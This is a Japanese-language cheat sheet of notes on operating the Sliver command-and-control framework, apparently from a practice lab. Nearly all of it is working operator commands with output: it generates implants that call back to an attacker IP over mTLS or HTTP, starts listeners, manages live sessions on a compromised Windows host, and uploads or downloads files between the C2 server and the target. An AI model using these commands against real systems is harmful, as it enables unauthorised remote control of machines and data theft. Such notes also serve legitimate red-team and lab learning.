## ## Implantの作成
```sh
# mtls
generate --mtls 10.10.16.3 --skip-symbols
## Linux
generate --mtls 10.10.16.3 --os linux --skip-symbols
generate --mtls 10.10.16.3:8888 --os linux
# HTTP/HTTPS
generate --http 10.10.16.3 --os linux --skip-symbols
## Port指定
generate --http 10.10.16.3:4566 --os linux --skip-symbols

# DNS
```
- Becon
```
generate --beacon --http <LHOST>:<LPORT> --os <OS> --arch <ARCH>
```
## ## Implantの設定を確認
```sh
sliver > implants 

 Name                Implant Type   Template   OS/Arch             Format   Command & Control            Debug 
=================== ============== ========== =============== ============ ============================ =======
 STRUCTURAL_CIRRUS   session        sliver     windows/amd64   EXECUTABLE   [1] mtls://10.10.16.3:8888   false 

```
## ## リスナーを起動&終了
```sh
sliver > mtls --lport 8888
[*] Starting mTLS listener ...
[*] Successfully started job #2

# リスナー終了
jobs -k <ID>
```

## ## 今張っている通信の確認
```sh
sliver > sessions

 ID         Transport   Remote Address       Hostname   Username   Operating System   Health  
========== =========== ==================== ========== ========== ================== =========
 7d59269d   mtls        10.10.10.180:49778   remote     <err>      windows/amd64      [ALIVE] 
 b75fc15e   mtls        10.10.10.180:49781   remote     <err>      windows/amd64      [ALIVE] 
 d177ac19   mtls        10.10.10.180:49780   remote     <err>      windows/amd64      [ALIVE] 
 e6340829   mtls        10.10.10.180:49779   remote     <err>      windows/amd64      [ALIVE] 
```

## ## sessionに繋ぐ
```
sliver > use 7d59269d
[*] Active session STRUCTURAL_CIRRUS (7d59269d-5a6a-4052-8702-d74ecc23a0e8)
```
## ## セッションを切る
- 一度セッションの中に入ってから切る方法
```sh
# 一度つなぐ
sliver > sessions
 ID         Transport   Remote Address       Hostname   Username   Operating System   Health  
========== =========== ==================== ========== ========== ================== =========
 7d59269d   mtls        10.10.10.180:49778   remote     <err>      windows/amd64      [ALIVE] 
 b75fc15e   mtls        10.10.10.180:49781   remote     <err>      windows/amd64      [ALIVE] 
 d177ac19   mtls        10.10.10.180:49780   remote     <err>      windows/amd64      [ALIVE] 
 e6340829   mtls        10.10.10.180:49779   remote     <err>      windows/amd64      [ALIVE] 

sliver > use b75fc15e

[*] Active session STRUCTURAL_CIRRUS (b75fc15e-766d-4fee-acc4-4ba69305dbdc)

---
# killする
sliver (STRUCTURAL_CIRRUS) > 
sliver (STRUCTURAL_CIRRUS) > 
sliver (STRUCTURAL_CIRRUS) > kill

⚠️  WARNING: This will kill the remote implant process

? Kill the active session? Yes
[!] Lost session b75fc15e STRUCTURAL_CIRRUS - 10.10.10.180:49781 (remote) - windows/amd64 - Sat, 07 Jun 2025 12:34:03 EDT

[*] Killed STRUCTURAL_CIRRUS (b75fc15e-766d-4fee-acc4-4ba69305dbdc)

sliver > 
sliver > 
sliver > sessions

 ID         Transport   Remote Address       Hostname   Username   Operating System   Health  
========== =========== ==================== ========== ========== ================== =========
 7d59269d   mtls        10.10.10.180:49778   remote     <err>      windows/amd64      [ALIVE] 
 d177ac19   mtls        10.10.10.180:49780   remote     <err>      windows/amd64      [ALIVE] 
 e6340829   mtls        10.10.10.180:49779   remote     <err>      windows/amd64      [ALIVE] 
```
- sliverのプロンプトから切る方法
```sh
sliver > sessions --kill 9efcff74


[!] Lost session 9efcff74 STRUCTURAL_CIRRUS - 10.10.10.180:49890 (remote) - windows/amd64 - Sat, 07 Jun 2025 21:27:47 EDT
```

---
## ## ファイル転送
### ### アップロード
- カレントディレクトリ内のファイルをアップロードする。(C2->TargetMachine)
```sh
upload <ファイル名>
```
### ### ダウンロード
カレントディレクトリ内のファイルをダウンロードする。(TargetMachine->C2)
```sh
download <ファイル名>
```

---
# # 公式ドキュメント
[公式ドキュメント](https://sliver.sh/tutorials?name=4+-+HTTP+Payload+staging)